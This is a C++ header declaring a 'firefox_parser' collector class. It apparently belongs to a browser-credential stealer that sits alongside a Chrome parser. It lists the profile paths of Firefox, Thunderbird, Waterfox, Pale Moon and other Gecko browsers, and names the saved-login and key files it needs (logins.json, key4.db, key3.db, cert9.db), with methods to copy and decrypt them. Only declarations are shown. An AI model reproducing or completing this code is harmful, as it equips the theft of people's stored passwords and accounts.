#pragma once
#include "ChromeParser.h"
#include "Forwards.h"
#include "ICollector.h"


class firefox_parser : public ICollector
{
public:
	firefox_parser();
	~firefox_parser() override = default;
public:

	List<AccountData> collect_data() override;

private:	
	
	List<String> get_mozilla_browsers();
	String get_profile_dir(const String& dir_localdata);	
	String get_mozilla_program_dir();
	List<AccountData> get_encrypted_data(const String& path_to_json);	
	bool prepare_imports(String profile_dir, String& out_temp_dir);
	
	const List<String> m_gecko_list{
		R"(\Mozilla\Firefox)", R"(\Waterfox)", R"(\K-Meleon)", R"(\Thunderbird)", R"(\Comodo\IceDragon)",
		R"(\8pecxstudios\Cyberfox)", R"(\NETGATE Technologies\BlackHaw)", R"(\Moonchild Productions\Pale Moon)"
	};
	const List<String> m_required_files { "key3.db", "key4.db", "logins.json", "cert9.db" };
	
	List<AccountData> m_account_data;
};
